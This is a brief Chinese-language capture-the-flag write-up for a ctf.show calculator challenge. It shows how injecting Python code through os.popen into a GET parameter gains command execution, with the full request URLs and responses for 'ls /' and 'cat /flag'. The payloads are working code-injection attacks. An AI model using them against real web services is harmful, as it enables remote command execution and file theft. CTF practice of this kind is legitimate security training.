发现这个计算器是在后端`_calculate`接受三个参数`number1`,`operator`,`number2`完成计算后把结果返回到前端的，发现报错是Python风格，尝试注入，使用`os.popen()`获取命令输出并返回
```
https://438de97b-0a8c-411d-b6ad-a375624273f5.challenge.ctf.show/_calculate?number1=1&operator=%2B&number2=0,__import__(%27os%27).popen(%27ls%20/%27).read()
```
```
{
  "result": [
    1,
    "app\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nstart.sh\nsys\ntmp\nusr\nvar\n"
  ]
}
```
```
https://438de97b-0a8c-411d-b6ad-a375624273f5.challenge.ctf.show/_calculate?number1=1&operator=%2B&number2=0,__import__(%27os%27).popen(%27cat%20/flag%27).read()
```
```
{
  "result": [
    1,
    "ctfshow{608fc1d3-6237-4937-b72a-40e2e1c1ff46}\n"
  ]
}
```